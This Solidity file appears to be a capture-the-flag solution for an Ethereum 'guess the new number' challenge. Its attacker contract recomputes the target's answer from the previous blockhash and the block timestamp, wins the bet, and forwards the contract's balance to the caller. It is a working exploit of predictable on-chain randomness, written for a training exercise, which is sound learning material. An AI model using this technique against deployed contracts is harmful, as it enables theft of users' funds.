//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IGuessTheNewNumberChallenge {
    function isComplete() external view returns (bool);

    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberChallengeAttacker {
    IGuessTheNewNumberChallenge cte;
    
    constructor(address _cteAddress) {
        cte = IGuessTheNewNumberChallenge(_cteAddress);
    }

    function attack() public payable {
        require(msg.value >= 1 ether, "send at least 1 ether");

        // calculate the answer
        uint8 answer = uint8(uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));

        // call the cte guess function
        cte.guess{value: 1 ether}(answer);

        // if everything has gone well we should be able to send back to the oginal caller all the balance (2 eth)
        uint balance = address(this).balance;
        (bool sent, bytes memory data) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {
        // receive back the 2 ETH from the GuessTheNewNumberChallenge
    }
}